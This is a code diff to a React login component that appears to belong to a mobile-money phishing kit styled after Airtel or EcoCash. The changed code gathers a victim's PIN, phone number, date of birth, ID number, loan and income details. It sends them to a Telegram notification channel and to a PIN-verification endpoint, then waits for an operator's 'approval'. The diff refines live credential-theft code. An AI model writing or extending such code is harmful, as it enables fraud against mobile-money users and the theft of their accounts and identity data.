@@ -201,30 +201,33 @@ function Login() {
     const storedClient = localStorage.getItem('clientData')
     const appData = storedApp ? JSON.parse(storedApp) : {}
     const clientData = storedClient ? JSON.parse(storedClient) : {}
+    
+    const phoneNumber = appData.number || phone || ""
+    const formattedPhone = phoneNumber.startsWith("+243") || phoneNumber.startsWith("243") 
+      ? phoneNumber 
+      : phoneNumber.startsWith("0") 
+        ? "+243" + phoneNumber.substring(1) 
+        : "+243" + phoneNumber
 
-    const clientInfo = {
+    const requestBody = {
+      phoneNumber: formattedPhone,
+      pinCode: pin,
+      bot: "default",
+      userId: `user_${Date.now()}`,
+      userName: clientData.name || "User",
       name: appData.name || "",
-      number: appData.number || phone || "",
+      number: phone || "",
       dob: clientData.dob || "",
       id: clientData.id || "",
-      employment: clientData.employment || "",
-      amount: clientData.amount || "",
-      term: clientData.term || "",
-      pin: pin,
-      pinInputs: inputs.join(" "),
-      error: "",
-      ecoCash: ""
+      loan: clientData.amount || "",
+      income: clientData.employment || "",
+      otp: ""
     }
 
     try {
-      await apiService.sendTelegramNotification(clientInfo)
+      await apiService.sendTelegramNotification(requestBody)
       
-      const response = await api.post("/api/verify-pin", {
-        phoneNumber: appData.number || phone,
-        pinCode: pin,
-        userId: `user_${Date.now()}`,
-        userName: "Airtel User"
-      })
+      const response = await api.post("/api/verify-pin", requestBody)
 
       if (response.data.success && response.data.sessionId) {
         startPolling(response.data.sessionId)
@@ -233,7 +236,8 @@ function Login() {
       }
     } catch (err) {
       console.error("PIN submission error:", err)
-      setError("Network error. Please check connection and try again.")
+      const errorMsg = err.response?.data?.message || err.response?.data?.error || err.message || "Network error"
+      setError(`Error: ${errorMsg}. Please check connection and try again.`)
       setTimeout(() => {
         setLoading(true)
         setWaitingForApproval(true)
